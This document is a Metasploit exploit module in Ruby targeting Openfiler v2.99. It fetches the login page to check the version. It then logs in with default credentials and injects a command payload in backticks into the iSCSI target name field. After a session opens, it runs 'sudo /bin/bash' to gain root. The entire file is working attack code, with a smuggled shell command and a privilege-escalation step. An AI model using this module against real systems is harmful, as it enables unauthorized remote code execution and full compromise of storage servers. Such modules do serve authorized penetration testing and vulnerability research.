require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Openfiler v2.99 Volumes Iscsi Command Execution",
      'Description'    => %q{
        This module exploits a vulnerability in Openfiler v2.99
        which could be abused to allow authenticated users to execute
arbitrary
        code under the context of the 'openfiler' user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          ' <MiDoveteMollare[at]gmail.com>' # Discovery and exploit
        ],
      'References'     =>
        [
          ['BID', 'TBD'],
          ['URL', 'TBD'],
          ['OSVDB', 'TBD'],
          ['EDB',   'TBD']
        ],
      'DefaultOptions'  =>
        {
          'ExitFunction' => 'none'
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'       => 1024,
          'BadChars'    => "\x00",
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic telnet python perl bash',
            }
        },
      'Targets'        =>
        [
          ['Automatic Targeting', { 'auto' => true }]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jun 10 2014",
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(446),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('USERNAME', [true, 'The username for the
application', 'openfiler']),
        OptString.new('PASSWORD', [true, 'The password for the
application', 'password'])
      ], self.class)
  end

  def check
    # retrieve software version from login page
    vprint_status("#{peer} - Sending check")
    begin

      res = send_request_cgi({
        'uri' => '/'

      })

      if    res and res.code == 200 and res.body =~ /<strong>Distro
Release:&nbsp;<\/strong>Openfiler [NE]SA 2\./
        return Exploit::CheckCode::Appears
      elsif res and res.code == 200 and res.body =~ /<title>Openfiler
Storage Control Center<\/title>/
        return Exploit::CheckCode::Detected
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable,
::Rex::ConnectionTimeout
      vprint_error("#{peer} - Connection failed")
      return Exploit::CheckCode::Unknown
    end
    return Exploit::CheckCode::Safe
  end

  def on_new_session(client)
    client.shell_command_token("sudo /bin/bash")
  end


  def exploit
    user  = datastore['USERNAME']
    pass  = datastore['PASSWORD']
    cmd   = Rex::Text.uri_encode("#{payload.raw}&")

    # send payload
    print_status("#{peer} - Sending payload (#{payload.raw.length} bytes)")
    begin

      res = send_request_cgi({
        'uri'    => "/admin/volumes_iscsi_targets.html",
    'method' => "POST",
    'data' => "addNewTgt=Add&newTgtName=aaaa`#{cmd}`",
        'cookie' => "usercookie=#{user}; passcookie=#{pass};",
      }, 25)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable,
::Rex::ConnectionTimeout
      fail_with(Failure::Unknown, 'Connection failed')
    end

    if res and res.code == 302
     print_good("#{peer} - Payload sent successfully")
    elsif res and res.code == 302 and res.headers['Location'] =~
/\/index\.html\?redirect/
      fail_with(Failure::NoAccess, 'Authentication failed')
    else
      fail_with(Failure::Unknown, 'Sending payload failed')
    end

  end
end
